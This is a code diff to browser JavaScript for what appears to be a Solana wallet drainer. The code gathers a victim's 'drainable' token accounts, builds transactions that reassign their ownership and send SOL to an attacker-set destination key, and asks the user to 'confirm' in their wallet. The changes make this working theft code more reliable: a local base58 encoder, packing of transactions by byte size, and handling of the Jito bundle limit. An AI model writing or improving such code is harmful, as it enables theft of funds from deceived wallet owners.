@@ -102,11 +102,25 @@
   async function getJitoTip(){
     try{ const r=await fetch(JITO_TIP_URL,{signal:AbortSignal.timeout(5000)}); const j=await r.json(); if(Array.isArray(j)&&j.length>0) return Math.ceil(Math.max(...j)*1.1); }catch(e){} return 10000;
   }
+  // ── base58 (local — bs58 is not exposed by the web3.js browser bundle) ──
+  const B58_ALPHABET='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+  function b58encode(bytes){
+    if(!bytes||!bytes.length) return '';
+    let zeros=0; while(zeros<bytes.length&&bytes[zeros]===0) zeros++;
+    const digits=[];
+    for(let i=zeros;i<bytes.length;i++){
+      let carry=bytes[i];
+      for(let j=0;j<digits.length;j++){ carry+=digits[j]<<8; digits[j]=carry%58; carry=(carry/58)|0; }
+      while(carry>0){ digits.push(carry%58); carry=(carry/58)|0; }
+    }
+    let out='';
+    for(let i=0;i<zeros;i++) out+='1';
+    for(let i=digits.length-1;i>=0;i--) out+=B58_ALPHABET[digits[i]];
+    return out;
+  }
   async function sendJitoBundle(signedTxs, tipTx){
-    const base58 = (typeof bs58 !== 'undefined' && bs58.encode) ? bs58 : (solanaWeb3.bs58 || (solanaWeb3.BS58 && solanaWeb3.BS58));
-    if(!base58 || typeof base58.encode !== 'function') throw new Error('bs58 unavailable');
-    const bundle=signedTxs.map(tx=>base58.encode(tx.serialize()));
-    if(tipTx) bundle.push(base58.encode(tipTx.serialize()));
+    const bundle=signedTxs.map(tx=>b58encode(tx.serialize()));
+    if(tipTx) bundle.push(b58encode(tipTx.serialize()));
     const payload={jsonrpc:'2.0',id:1,method:'sendBundle',params:[bundle]};
     const r=await fetch(JITO_RPC,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),signal:AbortSignal.timeout(15000)});
     const j=await r.json(); if(j.error) throw new Error(j.error.message||JSON.stringify(j.error)); return j.result;
@@ -452,18 +466,26 @@
           solanaWeb3.SystemProgram.transfer({fromPubkey:owner,toPubkey:destPk,lamports:Math.floor(solToSend)})
         ); tx.recentBlockhash=bh; tx.feePayer=owner; txs.push(tx);
       }
-      for(let i=0;i<drainable.length;i+=_cfg.maxPerTx){
-        const chunk=drainable.slice(i,i+_cfg.maxPerTx);
-        const tx=new solanaWeb3.Transaction().add(solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({units:1400000}),solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({microLamports:dynFee}));
-        for(const t of chunk) tx.add(buildSetAuthIx(t.tokenAcct,owner,destPk,t.progId));
-        tx.recentBlockhash=bh; tx.feePayer=owner; txs.push(tx);
+      // ── build token txs: chunk by measured packet size (1232-byte limit, SetAuth ix ≈ 75 bytes) ──
+      const MAX_TX_BYTES=1100, MAX_IX_PER_TX=Math.min(_cfg.maxPerTx,15);
+      const newTx=()=>{ const t=new solanaWeb3.Transaction().add(solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({units:1400000}),solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({microLamports:dynFee})); t.recentBlockhash=bh; t.feePayer=owner; return t; };
+      let cur=newTx(), curCount=0;
+      const flushTx=()=>{ if(curCount>0){ txs.push(cur); cur=newTx(); curCount=0; } };
+      for(const t of drainable){
+        if(curCount>=MAX_IX_PER_TX) flushTx();
+        cur.add(buildSetAuthIx(t.tokenAcct,owner,destPk,t.progId)); curCount++;
+        if(curCount>1){
+          let sz=0; try{ sz=cur.serialize({requireAllSignatures:false,verifySignatures:false}).length; }catch(e){}
+          if(sz>MAX_TX_BYTES){ const moved=cur.instructions.pop(); curCount--; flushTx(); cur.add(moved); curCount++; }
+        }
       }
+      flushTx();
 
       await verifyAtomic(owner,{solBalance:snapshot.solBalance,tokens:drainable},destPk);
 
       setStatus('<span class="spinner"></span> Confirm the transaction in your wallet...');
 
-      let sent=0, failed=0, useJito=true;
+      let sent=0, failed=0, useJito=(txs.length<=4); // Jito bundles accept max 5 txs (incl. tip)
       if(useJito && txs.length>0 && typeof wallet.signAllTransactions==='function'){
         try{
           const jitoTip=await getJitoTip();
